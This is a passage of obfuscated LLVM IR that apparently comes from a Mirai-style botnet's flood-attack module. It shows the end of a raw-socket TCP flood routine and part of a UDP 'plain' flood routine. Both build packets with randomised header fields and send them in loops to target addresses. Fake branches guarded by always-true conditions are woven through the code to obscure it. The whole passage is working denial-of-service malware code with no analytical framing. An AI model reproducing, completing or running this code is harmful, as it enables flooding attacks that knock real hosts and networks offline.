  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 7
  store i16 0, i16* %589, align 2
  %590 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %591 = bitcast %struct.iphdr* %590 to i16*
  %592 = call zeroext i16 @checksum_generic(i16* %591, i32 20)
  %593 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 7
  store i16 %592, i16* %594, align 2
  %595 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 6
  store i16 0, i16* %596, align 4
  %597 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %598 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %599 = bitcast %struct.tcphdr* %598 to i8*
  %600 = call zeroext i16 @htons(i16 zeroext 40) #7
  %601 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %597, i8* %599, i16 zeroext %600, i32 40)
  %602 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %603 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %602, i32 0, i32 6
  store i16 %601, i16* %603, align 4
  %604 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %605 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %604, i32 0, i32 1
  %606 = load i16, i16* %605, align 2
  %607 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %608 = load i32, i32* %17, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %607, i64 %609
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i32 0, i32 0
  %612 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %611, i32 0, i32 1
  store i16 %606, i16* %612, align 2
  %613 = load i32, i32* %18, align 4
  %614 = load i8*, i8** %38, align 8
  %615 = bitcast %union.__CONST_SOCKADDR_ARG* %41 to %struct.sockaddr**
  %616 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %617 = load i32, i32* %17, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i64 %618
  %620 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i32 0, i32 0
  %621 = bitcast %struct.sockaddr_in* %620 to %struct.sockaddr*
  store %struct.sockaddr* %621, %struct.sockaddr** %615, align 8
  %622 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %41, i32 0, i32 0
  %623 = load %struct.sockaddr*, %struct.sockaddr** %622, align 8
  %624 = call i64 @sendto(i32 %613, i8* %614, i64 60, i32 16384, %struct.sockaddr* %623, i32 16)
  br label %625

; <label>:625:                                    ; preds = %587
  %626 = load i32, i32* %17, align 4
  %627 = add nsw i32 %626, 1
  store i32 %627, i32* %17, align 4
  br label %338

; <label>:628:                                    ; preds = %originalBBpart212
  br label %321

; <label>:629:                                    ; preds = %120, %114
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %630 = alloca i8, align 1
  %631 = alloca %struct.attack_target*, align 8
  %632 = alloca i8, align 1
  %633 = alloca %struct.attack_option*, align 8
  %634 = alloca i32, align 4
  %635 = alloca i32, align 4
  %636 = alloca i8**, align 8
  %637 = alloca i8, align 1
  %638 = alloca i16, align 2
  %639 = alloca i8, align 1
  %640 = alloca i8, align 1
  %641 = alloca i16, align 2
  %642 = alloca i16, align 2
  %643 = alloca i32, align 4
  %644 = alloca i32, align 4
  %645 = alloca i8, align 1
  %646 = alloca i8, align 1
  %647 = alloca i8, align 1
  %648 = alloca i8, align 1
  %649 = alloca i8, align 1
  %650 = alloca i8, align 1
  %651 = alloca i32, align 4
  %652 = alloca %struct.iphdr*, align 8
  %653 = alloca %struct.tcphdr*, align 8
  %654 = alloca i8*, align 8
  %655 = alloca i8*, align 8
  %656 = alloca %struct.iphdr*, align 8
  %657 = alloca %struct.tcphdr*, align 8
  %658 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %630, align 1
  store %struct.attack_target* %1, %struct.attack_target** %631, align 8
  store i8 %2, i8* %632, align 1
  store %struct.attack_option* %3, %struct.attack_option** %633, align 8
  %659 = load i8, i8* %630, align 1
  %660 = zext i8 %659 to i64
  %661 = call noalias i8* @calloc(i64 %660, i64 8) #6
  %662 = bitcast i8* %661 to i8**
  store i8** %662, i8*** %636, align 8
  %663 = load i8, i8* %632, align 1
  %664 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %665 = call i32 @attack_get_opt_int(i8 zeroext %663, %struct.attack_option* %664, i8 zeroext 2, i32 0)
  %666 = trunc i32 %665 to i8
  store i8 %666, i8* %637, align 1
  %667 = load i8, i8* %632, align 1
  %668 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %669 = call i32 @attack_get_opt_int(i8 zeroext %667, %struct.attack_option* %668, i8 zeroext 3, i32 65535)
  %670 = trunc i32 %669 to i16
  store i16 %670, i16* %638, align 2
  %671 = load i8, i8* %632, align 1
  %672 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %673 = call i32 @attack_get_opt_int(i8 zeroext %671, %struct.attack_option* %672, i8 zeroext 4, i32 64)
  %674 = trunc i32 %673 to i8
  store i8 %674, i8* %639, align 1
  %675 = load i8, i8* %632, align 1
  %676 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %677 = call i32 @attack_get_opt_int(i8 zeroext %675, %struct.attack_option* %676, i8 zeroext 5, i32 1)
  %678 = trunc i32 %677 to i8
  store i8 %678, i8* %640, align 1
  %679 = load i8, i8* %632, align 1
  %680 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %681 = call i32 @attack_get_opt_int(i8 zeroext %679, %struct.attack_option* %680, i8 zeroext 6, i32 65535)
  %682 = trunc i32 %681 to i16
  store i16 %682, i16* %641, align 2
  %683 = load i8, i8* %632, align 1
  %684 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %685 = call i32 @attack_get_opt_int(i8 zeroext %683, %struct.attack_option* %684, i8 zeroext 7, i32 65535)
  %686 = trunc i32 %685 to i16
  store i16 %686, i16* %642, align 2
  %687 = load i8, i8* %632, align 1
  %688 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %689 = call i32 @attack_get_opt_int(i8 zeroext %687, %struct.attack_option* %688, i8 zeroext 17, i32 65535)
  store i32 %689, i32* %643, align 4
  %690 = load i8, i8* %632, align 1
  %691 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %692 = call i32 @attack_get_opt_int(i8 zeroext %690, %struct.attack_option* %691, i8 zeroext 18, i32 0)
  store i32 %692, i32* %644, align 4
  %693 = load i8, i8* %632, align 1
  %694 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %695 = call i32 @attack_get_opt_int(i8 zeroext %693, %struct.attack_option* %694, i8 zeroext 11, i32 1)
  %696 = trunc i32 %695 to i8
  store i8 %696, i8* %645, align 1
  %697 = load i8, i8* %632, align 1
  %698 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %699 = call i32 @attack_get_opt_int(i8 zeroext %697, %struct.attack_option* %698, i8 zeroext 12, i32 0)
  %700 = trunc i32 %699 to i8
  store i8 %700, i8* %646, align 1
  %701 = load i8, i8* %632, align 1
  %702 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %703 = call i32 @attack_get_opt_int(i8 zeroext %701, %struct.attack_option* %702, i8 zeroext 13, i32 0)
  %704 = trunc i32 %703 to i8
  store i8 %704, i8* %647, align 1
  %705 = load i8, i8* %632, align 1
  %706 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %707 = call i32 @attack_get_opt_int(i8 zeroext %705, %struct.attack_option* %706, i8 zeroext 14, i32 0)
  %708 = trunc i32 %707 to i8
  store i8 %708, i8* %648, align 1
  %709 = load i8, i8* %632, align 1
  %710 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %711 = call i32 @attack_get_opt_int(i8 zeroext %709, %struct.attack_option* %710, i8 zeroext 15, i32 0)
  %712 = trunc i32 %711 to i8
  store i8 %712, i8* %649, align 1
  %713 = load i8, i8* %632, align 1
  %714 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %715 = call i32 @attack_get_opt_int(i8 zeroext %713, %struct.attack_option* %714, i8 zeroext 16, i32 0)
  %716 = trunc i32 %715 to i8
  store i8 %716, i8* %650, align 1
  %717 = load i8, i8* %632, align 1
  %718 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %719 = load i32, i32* @LOCAL_ADDR, align 4
  %720 = call i32 @attack_get_opt_ip(i8 zeroext %717, %struct.attack_option* %718, i8 zeroext 25, i32 %719)
  store i32 %720, i32* %651, align 4
  %721 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %721, i32* %635, align 4
  %722 = icmp eq i32 %721, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %301
  %723 = load i32, i32* %17, align 4
  %_ = shl i32 %723, 1
  %724 = add nsw i32 %723, 1
  store i32 %724, i32* %17, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %321
  store i32 0, i32* %17, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %338
  %725 = load i32, i32* %17, align 4
  %726 = load i8, i8* %13, align 1
  %727 = zext i8 %726 to i32
  %728 = icmp slt i32 %725, %727
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %410
  %729 = call i32 @rand_next()
  %_15 = sub i32 0, %729
  %gen = add i32 %_15, 65535
  %_16 = sub i32 0, %729
  %gen17 = add i32 %_16, 65535
  %_18 = shl i32 %729, 65535
  %_19 = sub i32 %729, 65535
  %gen20 = mul i32 %_19, 65535
  %_21 = shl i32 %729, 65535
  %_22 = sub i32 %729, 65535
  %gen23 = mul i32 %_22, 65535
  %_24 = sub i32 0, %729
  %gen25 = add i32 %_24, 65535
  %_26 = sub i32 0, %729
  %gen27 = add i32 %_26, 65535
  %_28 = shl i32 %729, 65535
  %730 = and i32 %729, 65535
  %731 = trunc i32 %730 to i16
  %732 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %733 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %732, i32 0, i32 3
  store i16 %731, i16* %733, align 4
  br label %originalBB14

originalBB33alteredBB:                            ; preds = %originalBB33, %432
  %734 = load i16, i16* %24, align 2
  %735 = zext i16 %734 to i32
  %736 = icmp eq i32 %735, 65535
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %452
  %737 = call i32 @rand_next()
  %_38 = sub i32 0, %737
  %gen39 = add i32 %_38, 65535
  %_40 = sub i32 0, %737
  %gen41 = add i32 %_40, 65535
  %_42 = sub i32 0, %737
  %gen43 = add i32 %_42, 65535
  %_44 = shl i32 %737, 65535
  %738 = and i32 %737, 65535
  %739 = trunc i32 %738 to i16
  %740 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %741 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %740, i32 0, i32 0
  store i16 %739, i16* %741, align 4
  br label %originalBB37

originalBB48alteredBB:                            ; preds = %originalBB48, %474
  %742 = load i16, i16* %25, align 2
  %743 = zext i16 %742 to i32
  %744 = icmp eq i32 %743, 65535
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %494
  %745 = call i32 @rand_next()
  %_53 = shl i32 %745, 65535
  %_54 = shl i32 %745, 65535
  %_55 = sub i32 %745, 65535
  %gen56 = mul i32 %_55, 65535
  %_57 = sub i32 0, %745
  %gen58 = add i32 %_57, 65535
  %_59 = sub i32 %745, 65535
  %gen60 = mul i32 %_59, 65535
  %746 = and i32 %745, 65535
  %747 = trunc i32 %746 to i16
  %748 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %749 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %748, i32 0, i32 1
  store i16 %747, i16* %749, align 2
  br label %originalBB52

originalBB64alteredBB:                            ; preds = %originalBB64, %516
  %750 = load i32, i32* %26, align 4
  %751 = icmp eq i32 %750, 65535
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %542
  %752 = call i32 @rand_next()
  %753 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %754 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %753, i32 0, i32 3
  store i32 %752, i32* %754, align 4
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %562
  %755 = load i8, i8* %28, align 1
  %756 = icmp ne i8 %755, 0
  br label %originalBB72
}

declare zeroext i16 @checksum_generic(i16*, i32) #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.21
  %6 = load i32, i32* @y.22
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8**, align 8
  %19 = alloca i32*, align 8
  %20 = alloca i16, align 2
  %21 = alloca i16, align 2
  %22 = alloca i16, align 2
  %23 = alloca i8, align 1
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %30 = alloca i8*, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %31 = load i8, i8* %13, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %18, align 8
  %35 = load i8, i8* %13, align 1
  %36 = zext i8 %35 to i64
  %37 = call noalias i8* @calloc(i64 %36, i64 4) #6
  %38 = bitcast i8* %37 to i32*
  store i32* %38, i32** %19, align 8
  %39 = load i8, i8* %15, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 7, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %20, align 2
  %43 = load i8, i8* %15, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 6, i32 65535)
  %46 = trunc i32 %45 to i16
  store i16 %46, i16* %21, align 2
  %47 = load i8, i8* %15, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 0, i32 1458)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %22, align 2
  %51 = load i8, i8* %15, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 1, i32 1)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %23, align 1
  %55 = bitcast %struct.sockaddr_in* %24 to i8*
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 16, i32 4, i1 false)
  %56 = load i16, i16* %21, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  %59 = load i32, i32* @x.21
  %60 = load i32, i32* @y.22
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %67, label %70

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = call i32 @rand_next()
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %21, align 2
  br label %73

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i16, i16* %21, align 2
  %72 = call zeroext i16 @htons(i16 zeroext %71) #7
  store i16 %72, i16* %21, align 2
  br label %73

; <label>:73:                                     ; preds = %70, %67
  %74 = load i32, i32* @x.21
  %75 = load i32, i32* @y.22
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  store i32 0, i32* %17, align 4
  %82 = load i32, i32* @x.21
  %83 = load i32, i32* @y.22
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %90

; <label>:90:                                     ; preds = %282, %originalBBpart24
  %91 = load i32, i32* @x.21
  %92 = load i32, i32* @y.22
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i32, i32* %17, align 4
  %100 = load i8, i8* %13, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  %103 = load i32, i32* @x.21
  %104 = load i32, i32* @y.22
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %102, label %111, label %285

; <label>:111:                                    ; preds = %originalBBpart28
  %112 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %113 = load i8**, i8*** %18, align 8
  %114 = load i32, i32* %17, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8*, i8** %113, i64 %115
  store i8* %112, i8** %116, align 8
  %117 = load i16, i16* %20, align 2
  %118 = zext i16 %117 to i32
  %119 = icmp eq i32 %118, 65535
  br i1 %119, label %120, label %129

; <label>:120:                                    ; preds = %111
  %121 = call i32 @rand_next()
  %122 = trunc i32 %121 to i16
  %123 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %124 = load i32, i32* %17, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %123, i64 %125
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i32 0, i32 0
  %128 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %127, i32 0, i32 1
  store i16 %122, i16* %128, align 2
  br label %138

; <label>:129:                                    ; preds = %111
  %130 = load i16, i16* %20, align 2
  %131 = call zeroext i16 @htons(i16 zeroext %130) #7
  %132 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %133 = load i32, i32* %17, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 0
  %137 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %136, i32 0, i32 1
  store i16 %131, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %129, %120
  %139 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %140 = load i32*, i32** %19, align 8
  %141 = load i32, i32* %17, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i32, i32* %140, i64 %142
  store i32 %139, i32* %143, align 4
  %144 = icmp eq i32 %139, -1
  br i1 %144, label %145, label %162

; <label>:145:                                    ; preds = %138
  %146 = load i32, i32* @x.21
  %147 = load i32, i32* @y.22
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %145
  %154 = load i32, i32* @x.21
  %155 = load i32, i32* @y.22
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret void

; <label>:162:                                    ; preds = %138
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %163, align 4
  %164 = load i16, i16* %21, align 2
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %164, i16* %165, align 2
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 0, i32* %167, align 4
  %168 = load i32*, i32** %19, align 8
  %169 = load i32, i32* %17, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i32, i32* %168, i64 %170
  %172 = load i32, i32* %171, align 4
  %173 = bitcast %union.__CONST_SOCKADDR_ARG* %28 to %struct.sockaddr**
  %174 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  store %struct.sockaddr* %174, %struct.sockaddr** %173, align 8
  %175 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %28, i32 0, i32 0
  %176 = load %struct.sockaddr*, %struct.sockaddr** %175, align 8
  %177 = call i32 @bind(i32 %172, %struct.sockaddr* %176, i32 16) #6
  %178 = icmp eq i32 %177, -1
  br i1 %178, label %179, label %196

; <label>:179:                                    ; preds = %162
  %180 = load i32, i32* @x.21
  %181 = load i32, i32* @y.22
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %179
  %188 = load i32, i32* @x.21
  %189 = load i32, i32* @y.22
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %196

; <label>:196:                                    ; preds = %originalBBpart216, %162
  %197 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %198 = load i32, i32* %17, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = icmp slt i32 %203, 32
  br i1 %204, label %205, label %247

; <label>:205:                                    ; preds = %196
  %206 = load i32, i32* @x.21
  %207 = load i32, i32* @y.22
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %205
  %214 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %215 = load i32, i32* %17, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 1
  %219 = load i32, i32* %218, align 4
  %220 = call i32 @ntohl(i32 %219) #7
  %221 = call i32 @rand_next()
  %222 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %223 = load i32, i32* %17, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 2
  %227 = load i8, i8* %226, align 4
  %228 = zext i8 %227 to i32
  %229 = lshr i32 %221, %228
  %230 = add i32 %220, %229
  %231 = call i32 @htonl(i32 %230) #7
  %232 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %233 = load i32, i32* %17, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %235, i32 0, i32 0
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %236, i32 0, i32 2
  %238 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %237, i32 0, i32 0
  store i32 %231, i32* %238, align 4
  %239 = load i32, i32* @x.21
  %240 = load i32, i32* @y.22
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart225, label %originalBB18alteredBB

originalBBpart225:                                ; preds = %originalBB18
  br label %247

; <label>:247:                                    ; preds = %originalBBpart225, %196
  %248 = load i32*, i32** %19, align 8
  %249 = load i32, i32* %17, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i32, i32* %248, i64 %250
  %252 = load i32, i32* %251, align 4
  %253 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %254 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %255 = load i32, i32* %17, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i64 %256
  %258 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %257, i32 0, i32 0
  %259 = bitcast %struct.sockaddr_in* %258 to %struct.sockaddr*
  store %struct.sockaddr* %259, %struct.sockaddr** %253, align 8
  %260 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %261 = load %struct.sockaddr*, %struct.sockaddr** %260, align 8
  %262 = call i32 @connect(i32 %252, %struct.sockaddr* %261, i32 16)
  %263 = icmp eq i32 %262, -1
  br i1 %263, label %264, label %281

; <label>:264:                                    ; preds = %247
  %265 = load i32, i32* @x.21
  %266 = load i32, i32* @y.22
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %264
  %273 = load i32, i32* @x.21
  %274 = load i32, i32* @y.22
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %281

; <label>:281:                                    ; preds = %originalBBpart229, %247
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %17, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %17, align 4
  br label %90

; <label>:285:                                    ; preds = %originalBBpart28
  br label %286

; <label>:286:                                    ; preds = %originalBBpart237, %285
  store i32 0, i32* %17, align 4
  br label %287

; <label>:287:                                    ; preds = %330, %286
  %288 = load i32, i32* %17, align 4
  %289 = load i8, i8* %13, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp slt i32 %288, %290
  br i1 %291, label %292, label %333

; <label>:292:                                    ; preds = %287
  %293 = load i8**, i8*** %18, align 8
  %294 = load i32, i32* %17, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  store i8* %297, i8** %30, align 8
  %298 = load i8, i8* %23, align 1
  %299 = icmp ne i8 %298, 0
  br i1 %299, label %300, label %304

; <label>:300:                                    ; preds = %292
  %301 = load i8*, i8** %30, align 8
  %302 = load i16, i16* %22, align 2
  %303 = zext i16 %302 to i32
  call void @rand_str(i8* %301, i32 %303)
  br label %304

; <label>:304:                                    ; preds = %300, %292
  %305 = load i32, i32* @x.21
  %306 = load i32, i32* @y.22
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
